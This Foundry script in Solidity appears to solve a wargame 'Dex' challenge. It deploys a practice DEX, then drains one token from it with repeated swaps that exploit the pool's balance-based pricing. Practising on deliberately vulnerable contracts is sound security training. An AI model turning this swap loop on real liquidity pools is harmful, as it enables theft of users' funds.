// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Dex/Dex.sol";

contract DexScript is Script {

    address internal attacker;
    address internal deployer;
    Dex target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Dex(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new Dex();
            SwappableToken token1 = new SwappableToken(address(target), "TOKEN1", "TK1", 110);
            SwappableToken token2 = new SwappableToken(address(target), "TOKEN2", "TK2", 110);
            target.setTokens(address(token1), address(token2));
            target.approve(address(target), 100);
            target.addLiquidity(address(token1), 100);
            target.addLiquidity(address(token2), 100);
            token1.transfer(attacker, 10);
            token2.transfer(attacker, 10);
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        SwappableToken token1 = SwappableToken(target.token1());
        SwappableToken token2 = SwappableToken(target.token2());
        console.log("token1[attacker] : %s", token1.balanceOf(attacker));
        console.log("token2[attacker] : %s", token2.balanceOf(attacker));
        console.log("token1[dex]      : %s", token1.balanceOf(address(target)));
        console.log("token2[dex]      : %s", token2.balanceOf(address(target)));

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        target.approve(address(target), 100 ether);
        uint token1balance = token1.balanceOf(attacker);
        uint token2balance;
        while(token1balance != 110) {
            target.swap(address(token1), address(token2), token1balance);
            token2balance = token2.balanceOf(attacker);
            if(token2balance > token2.balanceOf(address(target))) { //last swap ffrom token2 to token1 must be calculated
                token2balance = 110 * token2.balanceOf(address(target)) / token1.balanceOf(address(target)); // 110 is the result we want
                console.log("swapAmount : %s", token1balance);
                target.swap(address(token2), address(token1), token2balance);
                break;
            }
            target.swap(address(token2), address(token1), token2balance);
            token1balance = token1.balanceOf(attacker);
        }
        vm.stopBroadcast();
        console.log("token1[attacker] : %s", token1.balanceOf(attacker));
        console.log("token2[attacker] : %s", token2.balanceOf(attacker));
        console.log("token1[dex]      : %s", token1.balanceOf(address(target)));
        console.log("token2[dex]      : %s", token2.balanceOf(address(target)));
    }
}